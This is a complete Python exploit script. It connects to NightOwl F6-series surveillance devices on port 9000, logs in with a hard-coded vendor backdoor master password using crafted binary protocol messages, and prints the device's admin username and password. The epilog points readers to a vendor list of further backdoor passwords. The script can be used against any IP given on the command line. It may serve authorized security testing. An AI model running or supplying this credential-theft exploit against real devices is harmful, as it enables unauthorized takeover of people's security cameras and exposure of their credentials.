#! /usr/bin/env python3

import argparse
import binascii
import socket
import sys
import re

# Arguments
parser = argparse.ArgumentParser(
                    description = 'This script recovers the admin '
                                  'password for NightOwl F6-series devices (and maybe others) '
                                  'using the published master password',
                    epilog = 'Backdoor pass for this model is 2x8axc\n'
                             'from https://support.nightowlsp.com/hc/en-us/articles/'
                             '360009216554-Night-Owl-Legacy-Devices. Check that link for other backdoor '
                             'passwords for older systems')
parser.add_argument('-t','--target', required=True ,help='NightOwl device IP')
parser.add_argument('-p','--port',type=int,default=9000,help='Default port 9000 should work')
parser.add_argument('-v','--verbose',
                    action='store_true')

args = parser.parse_args()

# Data parser
def parse_data(self):
    l = []

    for x in self.decode(errors='ignore').split('\x00'):
        resp = re.search(r'^[\x21-\x7F]+$', x)
        if resp:
            l.append(resp.group(0))

    return(l)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(2)

# Setup the connection
try:
    s.connect((args.target, args.port))
except Exception as e:
    print("\n[ERROR] %s connecting to %s\nCheck the IP and try again" % (e, args.target ))
    sys.exit(-1)

password = binascii.hexlify(b'2x8axc').decode()

str_init =    '000000001f0000005000000084060000000000000000000000000000000000000000000000000' \
             f'000000000000000000000000000{password}0000000000000000000000000000000000000000' \
              '000000000000000000000000000001000000'
str_getPass = '00000000d300f9010000000090060000'

s.send(binascii.unhexlify(str_init))
resp = s.recv(1024)

# Short response = it didn't accept the backdoor password
if not len(resp) > 16:
    print('\nSomething went wrong, exiting script...\n')
    sys.exit(-1)

# If -v is called, print out system data
if args.verbose:
    print(f"[VERBOSE] SYSTEM_DATA: {parse_data(resp)}")

# Get the user data
s.send(binascii.unhexlify(str_getPass))
resp = s.recv(1024)

userData = parse_data(resp)

if args.verbose:
    print(f"[VERBOSE] USER_DATA:   {userData}")

# Admin pass/user is always 0 and 1 slices respectively
print(f"\n[INFO] ADMIN USER: {userData[1]}")
print(f"[INFO] ADMIN PASS: {userData[0]}\n")

